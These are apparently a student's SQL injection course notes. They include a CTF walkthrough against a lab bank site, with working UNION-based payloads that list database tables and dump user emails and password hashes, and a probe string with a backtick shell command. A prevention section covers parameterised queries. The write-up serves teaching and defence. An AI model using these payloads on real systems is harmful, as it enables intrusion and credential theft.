# SQLi 

SQLi has existed for a number of years, yet it continues to be a common problem on many websites. 

When probing for SQL vulnerabilities, it is important to consider which SQL version the server is using. 

Popular versions inlude: 
* mySQL 
* SQLlite 
* PostgreSQL 
* MongoBD 

It is also important to consider the version they're using as small details in updates may be a unnotible, but perhaps dangerous entry point. 

Before considering any points of entry, one must first understand the website. What is the purpose of the website, what is it trying to protect and what can you possibly recon from it? 

Forms may be vulnerable to particular characters, including: 

```
‘”;<lol/>../--#`ls 
```

These characters allow one to change the semanitics of the code, altering the intentions of the developer who had not considered a potentially harmful input. 

## How does SQLi work? 

SQL, or Stuctured Query Language allows you to access and manipulise large databases through simple english. It is designed to be intuitive to understand. 

However, because it is mostly 'english' it is prone to dangerous attacks which could potentially change the query itself. 

Consider 

``` 
select * from users where username="admin" and password="password" limit 1; 
``` 

This query is straightforward, get the (one) user who has username "admin" and password "password."

The query is not designed to understand that `admin` and `password` is an input data and the rest is code to be executed using the input data. 

This is a common problem within vulnerabilities: mixing `data` and `control`. 

As a result we can manipulate the to get all users who are "admin" using

```
select * from users where username="admin" and password="x" or "1"="1" limit 1;
```

Note how we have ended the quotation even though that was not the developer's intention. 

## Where to start 

1) Test for breaking a SQL query using different quotations [", ', `] 
2) Find which SQL version it is 
3) Try to get everything in the table

## Weekly CTF Testing for SQLi [bigapp.quoccabank.com]
0) Notice that the site calls an api after sanitising the request so we have to make the call using the api url directly 

```
https://quoccabank.com/api/v1/bproducts?q=PAYLOAD
```
1) Tested for `'` (single quotation mark) and got the output 

```
Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘%’ OR pname LIKE ‘%PAYLOAD'%‘) AND bu IS NOT NULL) ORDER BY ’ at line 1

```

From this, we can tell that the server is using MySQL, and is searching using wildcard `%`, then ordering by the cateogory. 

We also know there are two columns named  `bu` and `cateorgory`. (Well you also know )from the site) 

2) Find all the columns using `INFORMATION_SCHEMA.COLUMNS` 

The information_schema allows you access the database meta-data(?). 

See [documentation](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html) for more information. (Although they're not very good haha) 

First, we have to prob to see how many columns we are required to query from bproducts (since they always have to match). 

We found that there are 6 items. 
``` 
Input: '')) UNION SELECT COLUMN_NAME, TABLE_NAME, 3, 4, 5, 6 from INFORMATION_SCHEMA.COLUMNS; -- COMMENT 
``` 

Now we have the correct syntax, we want to find the tables available. 

``` 
Input: '')) UNION SELECT COLUMN_NAME, TABLE_NAME, 3, 4, 5, 6 from INFORMATION_SCHEMA.tables; -- COMMENT 
``` 
Will change the original query 
```
SELECT * FROM (("%" OR pname LIKE %PAYLOAD%') AND  bu IS NOT NULL) ORDER BY cateogory 
```

to 
```
SELECT * FROM (("%" OR pname LIKE '%'')) UNION SELECT COLUMN_NAME, TABLE_NAME, 3, 4, 5, 6 from INFORMATION_SCHEMA.tables; -- COMMENT %') AND  bu IS NOT NULL) ORDER BY cateogory 
```

This query comments out the second half of the original query altogether.  

The result  
```
bproducts
users
```
3) Look up the column names for the two tables `bproducts` and `users`

```
Input: '')) UNION SELECT COLUMN_NAME, TABLE_NAME, 3, 4, 5, 6 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='bproducts'; -- COMMENT  

Result: Bproducts={id, pname, category, code, bu, owner}

Input: '')) UNION SELECT COLUMN_NAME, TABLE_NAME, 3, 4, 5, 6,  from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'; -- COMMENT

Result: Users={id, fname, lname, type, userid, email, mobile, city, state, postcode, password}

```
Note, we must match the number of columns within the query to the number the columns the queried table contains. 

4) From here, we can do many thing.. The first thing that comes to mind being, how can we obtain privileges? 

```
Input: random_string')) UNION SELECT email, userid, password, type, fname, lname from users -- .
```
From here, we can see the email `admin@quoccabank.com` and the password is a hash (Which we can reverse MD5 lookup). 

5) Then we can try to obtain sensitive information which the site hides 

```
Input: random_string') UNION SELECT email, userid, password, type, fname, lname from users -- .
```

## Preventing SQLi 

We can solve our confusion between `code` and `data` by using **paramatised queries**. 

For example 
```
query = "SELECT * from Customers WHERE CustomerID = @CustomerId" 
SQL_Command cmd = new SQL_Command(query); 
command.Paramters.Add(SQL_Paramter("@CustomerID", System.Data.SQLDbType.Int)); 

... 

command.Paramters["@CustomerId"].Value = 1; 
```

We should always be using parameterization to perform a query. 

Other defensive strategies include
* Application Layer 
    1) Handling error messages gracefully - which will make the injection a blind injection
    2) Filter user input by using parametised queries 
* Database Layer
    1) Minimise privilege level of database user
    2) Prevent arbitray connections to your database server 

## Reading Materials Provided 

* [Microsoft: Preventing SQLi](https://docs.microsoft.com/en-us/previous-versions/msp-n-p/ff648339(v=pandp.10)?redirectedfrom=MSDN)
* [Pentester Lab](https://pentesterlab.com/exercises/from_sqli_to_shell/course)
* [SQL Map](https://github.com/sqlmapproject/sqlmap)
* [Anatomy of an Attack: SQLi to Shell](https://resources.infosecinstitute.com/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/)